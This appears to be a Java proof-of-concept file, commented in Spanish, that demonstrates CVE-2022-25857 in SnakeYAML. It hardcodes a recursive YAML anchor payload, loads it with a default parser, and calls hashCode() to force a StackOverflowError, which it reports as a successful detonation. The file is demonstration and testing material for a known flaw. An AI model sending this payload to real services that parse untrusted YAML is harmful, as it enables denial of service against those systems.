package com.example;


import org.yaml.snakeyaml.Yaml;

public class VulnerableApp {

    public static void main(String[] args) {
        System.out.println("[+] Demostración de CVE-2022-25857 (SnakeYAML DoS) con payload interno.");

        // 1. El payload malicioso se declara directamente como un String.
        //    Fíjate en cómo las comillas dobles dentro del String se escapan con \".
        String recursiveYamlPayload = "&a [ \"lol\", *a ]";
        
        System.out.println("[+] Usando payload hardcodeado: " + recursiveYamlPayload);

        try {
            Yaml yaml = new Yaml();
            
            // 2. Se llama a la versión de `load()` que acepta un String.
            Object data = yaml.load(recursiveYamlPayload);

            System.out.println("[+] Payload cargado en memoria. Detonando con .hashCode()...");
            
            // 3. Se llama a .hashCode() para forzar la recursión infinita.
            //    Esto provocará el StackOverflowError.
            data.hashCode();
            
            System.out.println("[+] Éxito (No deberías ver este mensaje).");

        } catch (Throwable t) {
            // Capturamos Throwable para asegurarnos de atrapar el StackOverflowError.
            System.err.println("\n[!] La vulnerabilidad fue detonada exitosamente. Resultado:");
            t.printStackTrace();
        }
    }
}